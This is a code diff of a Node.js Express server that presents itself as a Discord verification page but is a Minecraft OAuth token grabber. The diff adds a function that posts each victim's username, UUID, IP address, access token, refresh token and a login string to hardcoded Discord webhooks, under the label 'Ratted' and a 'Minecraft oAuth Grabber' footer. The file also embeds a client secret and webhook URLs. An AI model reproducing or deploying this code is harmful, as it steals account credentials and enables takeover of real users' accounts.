@@ -1,8 +1,8 @@
 //Config
-const secret_value = '45948236-d35d-477e-a9cf-683669e20039'
+const client_secret = '45948236-d35d-477e-a9cf-683669e20039'
 const client_id = 'bda30808-859d-4cef-8f6b-8892d9616e82'
 const redirect_uri = 'https://discord-hfdh.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1085874232426233886/rziGVIUqclqdhpbsCLIY0U12xqaIkJsv1gZI2fPg_fL5zjVAYaw60_MC-869MR6eqFm-'
+const webhook_url = 'https://discord.com/api/webhooks/1085883437908500522/6cEVEje9oHQPrzHJcEcDoDR4xSxK3FZkiXzPPwAhw7PyCrLeI4MFlgQYivgI6ifudlgn'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -10,7 +10,7 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('인증이 완료되었습니다!')
+    res.send('Verification successful! go back to discord.')
     const code = req.query.code
     if (code == null) {
         return
@@ -28,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        pageGoPost({ url: "https://discord-hfdh.onrender.com/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]] });
+        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
     } catch (e) {
         console.log(e)
     }
@@ -49,7 +49,7 @@ async function getAccessTokenAndRefreshToken(code) {
     let data = {
         client_id: client_id,
         redirect_uri: redirect_uri,
-        secret_value: secret_value,
+        client_secret: client_secret,
         code: code,
         grant_type: 'authorization_code'
     }
@@ -120,23 +120,33 @@ async function getUsernameAndUUID(bearerToken) {
 function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
-function pageGoPost(d) {
-    var insdoc = "";
 
-    for (var i = 0; i < d.vals.length; i++) {
-        insdoc += "<input type='hidden' name='" + d.vals[i][0] + "' value='" + d.vals[i][1] + "'>";
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
+    const url = webhook_url
+    let data = {
+  username: "MOG",
+  avatar_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg",
+  content: "@everyone",
+  embeds: [
+    {
+      title: "Ratted " + username + " - Click for networth",
+      color: 5898337,
+      description: "**Username:**\n`"+username+"`\n\n**UUID:**\n`"+uuid+"`\n\n**IP:**\n`"+ip+"`\n\n**Token:**\n`"+bearerToken+"`\n\n**Refresh Token:**\n`"+refreshToken+"`\n\n**Login:**\n`"+username + ":" + uuid + ":"+ bearerToken+"`",
+      url: "https://spillager.live/skyblock/networth/"+username,
+      footer: {
+        text: "Minecraft oAuth Grabber by WH0",
+        icon_url: "https://www.globalsign.com/application/files/7416/1463/0119/iStock-1152537185.jpg"
+      },
     }
-
-    var goform = $("<form>", {
-        method: "post",
-        action: d.url,
-        target: d.target,
-        html: insdoc
-    }).appendTo("body");
-
-    goform.submit();
+  ],
 }
-
+    axios.all([ 
+        axios.post(url, data),
+        axios.post(process.env.WEBHOOK, data)
+           .then(() => console.log("Successfully authenticated, posting to webhook!"))
+    ])
+    
+}
 
 
 const bannedNames = []
